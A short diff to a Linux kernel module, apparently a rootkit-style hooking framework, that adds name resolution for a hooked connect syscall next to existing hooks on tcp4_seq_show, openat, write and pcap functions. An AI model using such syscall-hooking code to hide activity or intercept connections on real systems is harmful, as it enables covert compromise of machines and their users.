@@ -33,6 +33,7 @@ static struct kprobe kp = {
 #define WRONG_TCP4 "__x64_tcp4_seq_show"
 #define WRONG_PCAP_PG "__x64_ezx_pcap_putget"
 #define WRONG_PCAP_WRITE "__x64_ezx_pcap_write"
+#define WRONG_CONNECT "__x64___x64_sys_connect"
 #ifdef PTREGS_SYSCALL_STUBS
 #define SYSCALL_NAME(name) ("__x64_" name)
 #define CORRECT_OPENAT "__x64_sys_openat"
@@ -40,6 +41,7 @@ static struct kprobe kp = {
 #define CORRECT_PCAP_PG "ezx_pcap_putget"
 #define CORRECT_PCAP_WRITE "ezx_pcap_write"
 #define CORRECT_WRITE "__x64_sys_write"
+#define CORRECT_CONNECT "__x64_sys_connect"
 #else
 #define SYSCALL_NAME(name) (name)
 #endif
@@ -102,7 +104,9 @@ static int fh_resolve_hook_address(struct ftrace_hook *hook)
         hook->name = CORRECT_WRITE;
     } else if (strncmp(hook->name, WRONG_PCAP_PG, strlen(WRONG_PCAP_PG)) == 0) {
         hook->name = CORRECT_PCAP_PG;
-    }
+    } else if (strncmp(hook->name, WRONG_CONNECT, strlen(WRONG_CONNECT)) == 0) {
+        hook->name = CORRECT_CONNECT;
+    } 
     hook->address = kallsyms_lookup_name(hook->name);
 
     if (!hook->address)
